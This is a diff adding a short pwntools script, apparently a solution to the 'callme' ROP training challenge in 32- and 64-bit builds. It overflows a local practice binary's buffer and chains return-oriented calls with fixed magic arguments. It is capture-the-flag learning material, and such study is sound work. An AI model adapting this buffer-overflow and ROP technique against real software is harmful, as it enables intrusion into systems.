@@ -1,0 +1,24 @@
+#32 Bit
+from pwn import*
+p=process("./callme32")
+p.recv()
+payload=b'a'*44
+payload+=p32(0x080484f0)+p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)#+p32(0x080487f8)
+payload+=p32(0x08048550)+p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)#+p32(0x080487f8)
+payload+=p32(0x080484e0)+p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)
+p.sendline(payload)
+print(p.recv())
+print(p.recv())
+
+#64 Bit
+from pwn import*
+pop=0x000000000040093c
+p=process("./callme")
+p.recv()
+d=0xdeadbeefdeadbeef
+c=0xcafebabecafebabe
+f=0xd00df00dd00df00d
+payload = b'a'*40+p64(pop)+p64(d)+p64(c)+p64(f)+p64(0x00400720)+p64(pop)+p64(d)+p64(c)+p64(f)+p64(0x00400740)+p64(pop)+p64(d)+p64(c)+p64(f)+p64(0x004006f0)
+p.sendline(payload)
+print(p.recv())
+print(p.recv())
